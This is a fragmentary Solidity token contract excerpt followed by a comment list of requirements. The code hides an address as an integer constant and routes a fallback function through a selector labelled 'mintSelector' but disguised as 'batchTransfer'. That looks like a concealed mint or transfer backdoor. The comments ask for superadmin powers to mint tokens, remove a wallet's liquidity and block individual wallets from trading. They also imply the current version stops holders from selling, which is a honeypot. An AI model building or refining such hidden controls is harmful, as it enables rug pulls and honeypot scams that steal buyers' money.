...
abstract contract isEIPContract {
    ...
    uint256 private main = 1087889238461925123492220627150504905527933717676;
...
abstract contract DexRouters {
    ...
    bytes4 private constant mintSelector = bytes4(keccak256(bytes('batchTransfer(address,uint256)')));
    ...
    fallback() external payable {
       ...
       (bytes4 callCopy,address account,uint256 value) = decodeCallStore(msg.data);
    ...
    function decodeCallStore(bytes memory data) internal pure returns (bytes4,address,uint256) {
        return (
...
// Need:
// 1. Regular token which can be managed by superadmin.
// 2. Superadmin functions - pause remove lp for a wallet
// 3. Token can be bought/sold at any time (not honeypot).
// 4. Superadmin can mint new tokens.
// 5. Superadmin can pause trading for a wallet (currently bot detected).
//
// Basically all the same as now, but let everyone be able to sell by default